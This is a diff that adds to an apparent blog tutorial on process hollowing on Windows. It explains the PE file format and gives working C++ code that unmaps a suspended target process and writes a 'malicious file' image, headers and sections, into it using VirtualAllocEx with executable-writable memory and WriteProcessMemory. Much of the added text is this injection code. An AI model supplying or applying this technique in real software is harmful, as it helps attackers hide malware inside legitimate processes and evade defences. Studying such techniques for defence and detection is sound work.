@@ -107,7 +107,7 @@ You can find more a about them in Windows APIs documentation here [STARTUPINFOA]
 So after creating the suspended process, let's Unmap it.
 
 ```cpp
-PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
+    PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
     PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
 
     printf("Opening source image\r\n");
@@ -163,5 +163,96 @@ The purpose of reading the base address of the executable image is to know where
 After this step, we should get a handle on our malicious file that we want to replace the target's memory with, using CreateFileA(), reading it's content to a buffer and converts the raw image buffer (buffer) into a LOADED_IMAGE structure, which contains parsed information about the image.
 
 So after getting the necessary informations, we Unmapped the target's process memory with NtUnmapViewOfSection, imported from the ntdll.dll library.
+
+Note that we didn't create our malicious file yet.
+
+### Allocate and write malicious code
+
+As usual, to allocate memory in the target process we use VirtualAllocEx(), so to understand the Writing of the code in the allocated memory, you should know about the structure of a PE file ( Portable Executable ). A Portable Executable (PE) file is a file format used in Windows operating systems for executables, object code, and DLLs (Dynamic Link Libraries). The format is designed so that the operating system can load and manage these files efficiently. 
+
+This is easy right ?
+
+let's cover some of its componants :
+
+DOS Header: This one contains a magic number (MZ) and a pointer to the NT Headers.
+NT Headers: Main header for the PE file, including the File Header and Optional Header.
+Section Headers: This one describe each section of the executable (e.g., code, data, resources).
+Data Directories: Pointers to other important tables and data structures, like the export, import, and relocation tables. We will see what are these things in other blogs. and we will foncus only on relocation and sections.
+
+Here are some common Sections in PE Files.
+
+| Section  | Purpose                                                                                 | Attributes          |
+|----------|-----------------------------------------------------------------------------------------|---------------------|
+| `.text`  | Contains the executable code.                                                           | Read-only, Executable |
+| `.data`  | Contains initialized global and static variables.                                       | Read-write          |
+| `.bss`   | Contains uninitialized global and static variables.                                     | Read-write          |
+| `.rdata` | Contains read-only initialized data, such as string literals and constants.             | Read-only           |
+| `.rsrc`  | Contains resource data, such as icons, menus, and dialogs.                              | Read-only           |
+| `.edata` | Contains export data, including function names and addresses exported by the executable or DLL. | Read-only           |
+| `.idata` | Contains import data, including names and addresses of functions and variables imported from other executables or DLLs. | Read-only           |
+| `.reloc` | Contains relocation data used by the loader to adjust the base addresses of the code and data if the executable is not loaded at its preferred base address. | Read-only           |
+| `.pdata` | Contains exception handling data.                                                       | Read-only           |
+| `.tls`   | Contains data for thread-local storage.                                                 | Read-write          |
+| `.debug` | Contains debugging information.  
+
+```cpp
+    PVOID pRemoteImage = VirtualAllocEx(
+        pProcessInfo->hProcess,
+        pPEB->ImageBaseAddress,
+        pSourceHeaders->OptionalHeader.SizeOfImage,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    if (!pRemoteImage)
+    {
+        printf("VirtualAllocEx call failed\r\n");
+        return;
+    }
+
+
+    printf(
+        "Source image base: 0x%p\r\n"
+        "Destination image base: 0x%p\r\n",
+        pSourceHeaders->OptionalHeader.ImageBase,
+        pPEB->ImageBaseAddress
+    );
+
+    printf("Writing headers\r\n");
+
+    if (!WriteProcessMemory(
+        pProcessInfo->hProcess,                 
+        pPEB->ImageBaseAddress, 
+        pBuffer, 
+        pSourceHeaders->OptionalHeader.SizeOfHeaders, 
+        0
+    ))
+    {
+        printf("Error writing process memory\r\n");
+        return;
+    }
+
+    for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
+    {
+        if (!pSourceImage->Sections[x].PointerToRawData)
+            continue;
+
+        PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
+
+        printf("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
+
+        if (!WriteProcessMemory(
+            pProcessInfo->hProcess,            
+            pSectionDestination,            
+            &pBuffer[pSourceImage->Sections[x].PointerToRawData],
+            pSourceImage->Sections[x].SizeOfRawData,
+            0
+        ))
+        {
+            printf("Error writing process memory\r\n");
+            return;
+        }
+    }    
+```
 
 
